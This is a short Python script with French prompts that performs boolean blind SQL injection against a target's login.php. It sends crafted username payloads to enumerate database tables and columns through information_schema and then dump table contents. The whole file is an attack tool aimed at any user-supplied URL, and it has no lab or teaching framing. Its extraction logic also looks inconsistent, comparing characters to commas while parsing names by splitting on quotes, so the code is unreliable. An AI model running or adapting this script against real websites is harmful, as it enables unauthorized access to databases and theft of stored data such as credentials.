import requests

url = input("Entrez l'URL : ")
db_name = input("Entrez le nom de la base de données : ")
table_names = []
payload = {"username": f"admin' and database()='{db_name}'--", "password": "test", "submit": "submit"}
response = requests.post(url + "/login.php", data=payload)
if "Incorrect" not in response.text:
    print(f"Base de données sélectionnée : {db_name}")
    payload = {"username": f"admin' and substr((select group_concat(table_name separator ', ') from information_schema.tables where table_schema='{db_name}'),1,1)!=''--", "password": "test", "submit": "submit"}
    response = requests.post(url + "/login.php", data=payload)
    if "Incorrect" not in response.text:
        print("Tables trouvées :")
        for i in range(1, 100):
            payload = {"username": f"admin' and substr((select group_concat(table_name separator ', ') from information_schema.tables where table_schema='{db_name}'),{i},1)=','--", "password": "test", "submit": "submit"}
            response = requests.post(url + "/login.php", data=payload)
            if "Incorrect" not in response.text:
                table_name = response.text.split("'")[1]
                table_names.append(table_name)
                print(f"{i}. {table_name}")
            else:
                break
        for table_name in table_names:
            print(f"Contenu de la table {table_name}:")
            column_names = []
            payload = {"username": f"admin' and substr((select group_concat(column_name separator ', ') from information_schema.columns where table_name='{table_name}'),1,1)!=''--", "password": "test", "submit": "submit"}
            response = requests.post(url + "/login.php", data=payload)
            if "Incorrect" not in response.text:
                for i in range(1, 100):
                    payload = {"username": f"admin' and substr((select group_concat(column_name separator ', ') from information_schema.columns where table_name='{table_name}'),{i},1)=','--", "password": "test", "submit": "submit"}
                    response = requests.post(url + "/login.php", data=payload)
                    if "Incorrect" not in response.text:
                        column_name = response.text.split("'")[1]
                        column_names.append(column_name)
                payload = {"username": f"admin' and substr((select group_concat({','.join(column_names)} separator ', ') from {table_name}),1,1)!=''--", "password": "test", "submit": "submit"}
                response = requests.post(url + "/login.php", data=payload)
                if "Incorrect" not in response.text:
                    for i in range(1, 100):
                        payload = {"username": f"admin' and substr((select group_concat({','.join(column_names)} separator ', ') from {table_name}),{i},1)=','--", "password": "test", "submit": "submit"}
                        response = requests.post(url + "/login.php", data=payload)
                        if "Incorrect" not in response.text:
                            print(response.text.split("'")[1])
                        else:
                            break
